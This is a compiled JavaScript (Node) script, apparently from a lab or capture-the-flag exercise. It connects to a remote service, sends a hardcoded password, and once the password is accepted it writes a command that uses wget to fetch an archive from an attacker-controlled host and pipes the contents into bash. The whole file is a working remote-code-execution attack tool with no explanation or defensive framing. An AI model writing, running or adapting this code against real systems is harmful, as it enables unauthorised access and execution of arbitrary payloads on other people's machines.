"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (_) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
exports.__esModule = true;
var net = require("net");
var _a = process.env, _b = _a.RHOST, RHOST = _b === void 0 ? '127.0.0.1' : _b, _c = _a.RPORT, RPORT = _c === void 0 ? '9001' : _c, _d = _a.LHOST, LHOST = _d === void 0 ? '10.13.1.79' : _d, _e = _a.LPORT, LPORT = _e === void 0 ? '1234' : _e;
var TIMEOUT = 5000;
var doProd = function () {
    return new Promise(function (resolve, reject) {
        var sock = new net.Socket();
        var port = parseInt(RPORT, 10);
        var onError = function () {
            var args = [];
            for (var _i = 0; _i < arguments.length; _i++) {
                args[_i] = arguments[_i];
            }
            sock.destroy();
            reject(new Error("Socket error: ".concat(RPORT)));
        };
        sock.setTimeout(TIMEOUT);
        sock.once('error', onError);
        sock.once('timeout', onError);
        sock.connect(port, RHOST, function () {
            sock.on('data', function (data) {
                console.log(data.toString());
                if (/DONE/i.test(data.toString())) {
                    sock.destroy();
                    return resolve();
                }
                if (/correct password/i.test(data.toString())) {
                    console.log('Password accepted.');
                    sock.write("wget -q -O- ".concat(LHOST, ":").concat(LPORT, "/kk/kpz|tar -xvJO|bash\n"), function (err) {
                        if (err) {
                            console.error('Error writing to socket:', err);
                            sock.destroy();
                            return reject(err);
                        }
                        console.log('Command sent successfully.');
                    });
                }
            });
            sock.write('yourmom!\n', function (err) {
                if (err) {
                    console.error('Error writing to socket:', err);
                    sock.destroy();
                    return reject(err);
                }
                console.log('Data sent successfully.');
            });
            // sock.end();
            // resolve();
        });
    });
};
var run = function () { return __awaiter(void 0, void 0, void 0, function () {
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0: return [4 /*yield*/, doProd()];
            case 1:
                _a.sent();
                return [2 /*return*/];
        }
    });
}); };
run();
